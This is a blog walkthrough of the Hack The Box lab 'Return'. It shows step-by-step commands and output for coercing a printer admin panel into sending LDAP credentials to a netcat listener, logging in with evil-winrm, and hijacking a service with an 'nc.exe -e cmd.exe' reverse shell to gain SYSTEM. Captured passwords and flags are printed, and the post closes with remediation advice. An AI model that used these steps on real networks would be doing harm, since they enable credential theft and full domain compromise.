# Return

Target: Return (Hack The Box) OS: Windows Difficulty: Easy Classification: Active Directory Misconfiguration & Privilege Escalation Author…

***

### Return to Sender: Auditing Printer Vulnerabilities in Active Directory

**Target:** Return (Hack The Box) **OS:** Windows **Difficulty:** Easy **Classification:** Active Directory Misconfiguration & Privilege Escalation **Author:** R00t3dbyFa17h

![](https://cdn-images-1.medium.com/max/800/1*P0ukBlCUI9Sf7f2PEclekg.png)

### Executive Summary

This assessment targeted “Return,” a Windows Server 2019 instance acting as a Domain Controller and Print Server. The initial foothold was gained by identifying a legacy **Printer Administration Panel** hosting a misconfigured LDAP service. This vulnerability led to the exposure of cleartext credentials for the `svc-printer` account. Root privilege escalation was accomplished by identifying that the compromised service account was a member of the **Server Operators** group. This privileged membership allowed for the modification of system services, enabling the execution of a malicious binary as **NT AUTHORITY\SYSTEM**, resulting in total domain compromise.

### 1.0 Initial Foothold

#### 1.1 Reconnaissance and Enumeration

**1.1.1 Scanning the Target:** The assessment began with a full TCP port scan using Nmap to identify all open services and gather version information on the target `10.10.11.108`.

```
nmap -sC -sV -A -vvv -p- 10.10.11.108
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-19 16:01 EST
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:01
Completed NSE at 16:01, 0.00s elapsed
Initiating Ping Scan at 16:01
Scanning 10.10.11.108 [4 ports]
Completed Ping Scan at 16:01, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 16:01
Completed Parallel DNS resolution of 1 host. at 16:01, 0.09s elapsed
DNS resolution of 1 IPs took 0.09s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 16:01
Not shown: 65509 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-12-20 00:16:25Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49679/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49682/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49719/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
```

**1.1.2 Key Findings:**

* **Port 53 (DNS) & 88 (Kerberos):** Confirms the target is a Domain Controller.
* **Port 80 (HTTP):** Microsoft IIS httpd 10.0.
* **Port 389 (LDAP):** Windows Active Directory LDAP.
* **Port 5985 (WinRM):** Open, indicating potential for remote management if credentials are found.

**1.1.3 Host Configuration:** Netexec identified the hostname as **`PRINTER.return.local`** and confirmed the OS build as Windows 10.0 Build 17763 x64 (Server 2019).

```

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Return]
└─$ netexec smb 10.10.11.108 --shares
SMB         10.10.11.108    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
```

#### 1.2 Web Application Enumeration

**1.2.1 Analysis:** Navigating to **`http://10.10.11.108`** revealed the "HTB Printer Admin Panel". The site is built on PHP, confirmed by the **`X-Powered-By: PHP/7.4.13`** header. Directory brute-forcing with Feroxbuster located a **`/settings.php`** page.

**1.2.2 Information Leakage:** The **`settings.php`** page presented a configuration form with a "Server Address", "Username", and a masked "Password" field.

![](https://cdn-images-1.medium.com/max/800/1*HHeSA8LAVqhV0agDAm0swA.png)

**1.2.3 Vulnerability Identification:** Upon inspecting the network traffic, we observed that submitting the form sends a POST request with a single parameter: **`ip`**. This indicates that the application attempts to authenticate to the specified IP address using the stored credentials. This behavior allows for an **Authentication Coercion** attack.

### 2.0 Exploitation (Credential Capture)

**2.1.1 Payload Construction:** To exploit this, we did not need to crack a hash. We simply needed to trick the printer into sending the password to us. We set up a Netcat listener on port 389 (standard **LDAP**) to catch the connection.

**2.1.2 Gaining the Foothold:**

1. **Listener Setup:** We started the listener on our attack box: **`nc -lnvp 389`**.

```

┌──(nicholas㉿Nicholas)-[~/HTB/Labs/Return]
└─$ nc -lvnp 389
listening on [any] 389 ...
```

1. **Trigger:** On the web panel, we changed the “Server Address” (IP) to our attack IP (**`10.10.14.x`**) and clicked "Update".

![](https://cdn-images-1.medium.com/max/800/1*EQauiku83_VZJtmOvpf3Cw.png)

1. **Capture:** The server immediately connected to our listener, transmitting the credentials in cleartext.

#### **Captured Data:**

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Return]
└─$ nc -lvnp 389
listening on [any] 389 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.108] 54405
0*`%return\svc-printer�
                       1edFg43012!!
```

**Access Achieved:** We validated these credentials using **`evil-winrm`** (since Port 5985 was open). **`evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'`**

**Status:** User session established as **`return\svc-printer`**.

**2.3 User Flag:** Upon logging in, we navigated to the user’s Desktop to retrieve the user flag.

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Return]
└─$ evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'

Evil-WinRM shell v3.9

Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-printer> cd Desktop
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> type user.txt
d2ca37357764d6f82c6c4cdaf3493a1b
*Evil-WinRM* PS C:\Users\svc-printer\Desktop>

```

### 3.0 Privilege Escalation (System)

**3.1.1 Enumeration of User “svc-printer”:** With access established, we checked the user’s group memberships.

**Command:** **`whoami /groups`**

**Result:**

```
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups

GROUP INFORMATION
---

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
```

**3.1.2 Vulnerability Analysis:** Membership in the **Server Operators** group is a critical misconfiguration for a service account. It grants the ability to start, stop, and modify system services. We can abuse this by reconfiguring a service running as SYSTEM to execute a reverse shell.

**3.1.3 The Exploit Chain:**

1. **Upload Payload:** We uploaded a Netcat binary (**`nc.exe`**) to **`C:`**`\ProgramData\`.
2. **Modify Service:** We targeted the **`VMTools`** service (or any other suitable service).

```
Evil-WinRM* PS C:\Users\svc-printer\Documents> upload /usr/share/windows-resources/binaries/nc.exe C:\ProgramData\nc.exe

Info: Uploading /usr/share/windows-resources/binaries/nc.exe to C:\Users\svc-printer\Documents\C:ProgramDatanc.exe

Data: 79188 bytes of 79188 bytes copied

Info: Upload successful!
```

### Step 3: The Configuration (Aiming the Gun)

Now we need to pick a service to hijack. A common target on Hack The Box machines is **`VMTools`** (or **`VSS`**), but any service that runs as **`LocalSystem`** will work.

We are going to use the Windows Service Control (**`sc.exe`**) command to change the "Binary Path" of the service. We will tell it: _"Hey, instead of running the VM Tools, run my Netcat and connect back to me."_

**Command:**

```
*Evil-WinRM* PS C:\ProgramData> sc.exe config VMTools binPath="C:\ProgramData\nc.exe -e cmd.exe 10.10.14.19 4444"
[SC] ChangeServiceConfig SUCCESS

Evil-WinRM* PS C:\ProgramData> sc.exe stop VMTools
[SC] ControlService FAILED 1062:

The service has not been started.

*Evil-WinRM* PS C:\ProgramData> sc.exe start VMTools
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.

```

Check your listener now!

```
──(nicholas㉿Nicholas)-[~/HTB/Labs/Return]
└─$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.108] 54595
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>powershell -c "Get-Content root.txt"
powershell -c "Get-Content root.txt"
4037d638d9608c07569977bf62ea4327

C:\Users\Administrator\Desktop>

```

### 4.0 Blue Team Remediation

To prevent this attack path, the following changes are recommended:

1. **LDAP Security:** Configure **LDAP** Signing and Sealing **(LDAPS)** to prevent cleartext credential transmission.
2. **Input Validation:** The web application should not allow arbitrary IP addresses for the **LDAP** server or should require re-authentication before changing critical settings.
3. **Least Privilege:** The **`svc-printer`** account should not be in the **Server Operators** group. Create a custom service account with only the specific permissions required for printing tasks.

### 5.0 Conclusion

The “Return” machine demonstrates the danger of legacy administrative panels. A simple feature designed for configuration convenience (updating the **LDAP** server) became the fatal flaw that leaked domain credentials. Combined with over-privileged group membership, this allowed for total system compromise in minutes.

**The Verse:**

> “He who walks with integrity walks securely, but he who perverts his ways will become known.”\* — \*_**Proverbs 10:9 (NKJV)**_

**Connection:** The system failed because it lacked integrity — it tried to hide a secret (the password) but exposed it through a perverted configuration (allowing the IP change). True security requires integrity in network design, ensuring credentials are never transmitted to untrusted destinations.

### 🚀🚀Join the Mission🚀🚀

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

* Is there a specific tool you wish existed?
* Is there a hacking concept you want me to learn and explain?
* Do you have a “brick wall” you’re hitting in your own research?

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

[**Join the Iron-Breach Discord Server!**\
_&#x41;n advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…_&#x64;iscord.gg](https://discord.gg/8buAHtm2fK)

By [Nicholas Mullenski](https://medium.com/@nicholasmullenski) on [December 26, 2025](https://medium.com/p/5a93160be99d).

[Canonical link](https://medium.com/@nicholasmullenski/return-to-sender-auditing-printer-vulnerabilities-in-active-directory-5a93160be99d)

Exported from [Medium](https://medium.com) on September 1, 2026.
